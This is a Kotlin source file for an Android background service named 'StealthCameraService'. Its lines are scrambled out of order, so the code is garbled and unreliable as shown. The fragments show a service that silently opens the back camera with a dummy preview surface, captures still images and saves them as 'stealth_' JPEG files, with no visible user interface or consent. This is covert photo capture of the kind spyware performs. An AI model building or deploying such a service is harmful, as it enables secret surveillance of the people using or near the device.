package com.anti.rootadbcontroller.services

import android.os.IBinder
        startBackgroundThread()
            backgroundThread.join()
                stopSelf()
        }
                },
        cameraDevice = null
}
import android.os.HandlerThread
        super.onCreate()
        try {
                image.close()
            onDisconnected(camera)
                    }
        cameraDevice?.close()
    }
import android.os.Handler
    override fun onCreate() {
        backgroundThread.quitSafely()
                saveImage(bytes)
        override fun onError(camera: CameraDevice, error: Int) {
                        Log.e(TAG, "Failed to configure capture session")
        captureSession = null
        private const val TAG = "StealthCameraService"
import android.os.Environment

    private fun stopBackgroundThread() {
                buffer.get(bytes)

                    override fun onConfigureFailed(session: CameraCaptureSession) {
        captureSession?.close()
    companion object {
import android.media.ImageReader
    override fun onBind(intent: Intent?): IBinder? = null

                val bytes = ByteArray(buffer.remaining())
        }

    private fun closeCamera() {

import android.hardware.camera2.CaptureRequest

    }
                val buffer = image.planes[0].buffer
            cameraDevice = null
                    }

    }
import android.hardware.camera2.CameraManager
    private lateinit var backgroundHandler: Handler
        backgroundHandler = Handler(backgroundThread.looper)
                val image = reader.acquireLatestImage()
            camera.close()
                        capture()
    }
        }
import android.hardware.camera2.CameraDevice
    private lateinit var backgroundThread: HandlerThread
        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
            imageReader.setOnImageAvailableListener({ reader ->
        override fun onDisconnected(camera: CameraDevice) {
                        captureSession = session
        }
            Log.e(TAG, "Failed to save image", e)
import android.hardware.camera2.CameraCharacteristics
    private lateinit var imageReader: ImageReader
    private fun startBackgroundThread() {
            imageReader = ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 1)

                    override fun onConfigured(session: CameraCaptureSession) {
            Log.e(TAG, "Error capturing image", e)
        } catch (e: IOException) {
import android.hardware.camera2.CameraCaptureSession
    private var captureSession: CameraCaptureSession? = null


        }
                object : CameraCaptureSession.StateCallback() {
        } catch (e: CameraAccessException) {
            Log.d(TAG, "Image saved to ${file.absolutePath}")
import android.hardware.camera2.CameraAccessException
    private var cameraDevice: CameraDevice? = null
    }
            } ?: return
            createCaptureSession()
                listOf(surface, imageReader.surface),
            captureSession?.capture(captureBuilder.build(), null, null)
            FileOutputStream(file).use { it.write(bytes) }
import android.graphics.SurfaceTexture

        stopBackgroundThread()
                    .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
            cameraDevice = camera
            cameraDevice?.createCaptureSession(
            captureBuilder.addTarget(imageReader.surface)
        try {
import android.content.Intent
class StealthCameraService : Service() {
        closeCamera()
                manager.getCameraCharacteristics(it)
        override fun onOpened(camera: CameraDevice) {

            val captureBuilder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            )
import android.app.Service

        super.onDestroy()
            val cameraId = manager.cameraIdList.firstOrNull {
    private val stateCallback = object : CameraDevice.StateCallback() {
            captureRequestBuilder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
        try {
                "stealth_$timeStamp.jpg"
import java.util.Locale
    override fun onDestroy() {
        try {

            captureRequestBuilder.addTarget(imageReader.surface)
    private fun capture() {
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
import java.util.Date

        val manager = getSystemService(CAMERA_SERVICE) as CameraManager
    }
            val captureRequestBuilder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)

            File(
import java.text.SimpleDateFormat
    }
    private fun openCamera() {
        }
            val surface = Surface(surfaceTexture)
    }
        val file =
import java.io.IOException
        return START_NOT_STICKY

            Log.e(TAG, "Cannot access camera", e)
            val surfaceTexture = SurfaceTexture(10)
        }
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
import java.io.FileOutputStream
        openCamera()
    }
        } catch (e: CameraAccessException) {
        try {
            Log.e(TAG, "Error creating capture session", e)
    private fun saveImage(bytes: ByteArray) {
import java.io.File
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        }
            manager.openCamera(cameraId, stateCallback, backgroundHandler)
    private fun createCaptureSession() {
        } catch (e: CameraAccessException) {

import android.view.Surface

            Log.e(TAG, "Error stopping background thread", e)


            )
    }
import android.util.Log
    }
        } catch (e: InterruptedException) {
            }, backgroundHandler)
    }
                backgroundHandler
        imageReader.close()
